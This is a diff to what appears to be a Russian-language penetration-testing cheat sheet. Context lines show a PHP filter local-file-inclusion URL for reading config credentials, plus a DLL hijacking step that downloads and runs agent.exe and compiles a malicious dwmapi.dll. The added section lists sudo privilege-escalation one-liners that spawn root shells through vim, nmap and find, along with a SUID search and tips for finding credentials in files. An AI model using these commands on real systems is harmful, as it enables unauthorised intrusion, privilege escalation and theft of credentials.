@@ -80,7 +80,7 @@ http://target.com/index.php?page=php://filter/convert.base64-encode/resource=con
 ```
 Декодируем данные, находим креды, используем их в дальнейшем
 
-** DLL Hijacking
+**DLL Hijacking**
 
 Код:
 
@@ -109,3 +109,47 @@ e -O C:\\Windows\\Tasks\\agent.exe ; cmd /c C:\\Windows\\Tasks\\agent.exe"
 ```
 x86_64-w64-mingw32-gcc -o dwmapi.dll -shared source.c
 ```
+
+**Команды от sudo**
+
+Если разрешен vim:
+
+```
+sudo vim -c ':!/bin/bash'
+
+Или:
+
+sudo vim
+:!/bin/bash
+```
+
+Если разрешен nmap:
+
+```
+sudo nmap --interactive
+# Внутри nmap:
+!sh
+```
+
+Если разрешен find:
+
+```
+sudo find . -exec /bin/bash \;
+```
+
+Если разрешен /bin/sh или /bin/bash (редко, но возможно):
+
+```
+sudo /bin/bash
+# или
+sudo su
+```
+
+Проверка SUID/SGID бинарных файлов: Поиск файлов, которые запускаются с правами владельца, даже если пользователь имеет меньшие привилегии.
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Уязвимости ядра или сервисов: Поиск устаревших версий ОС или неправильно настроенных служб.
+Учетные данные в файлах: Поиск паролей или ключей в конфигурационных файлах (/etc/passwd, /var/log, файлы веб-серверов и т.д.).
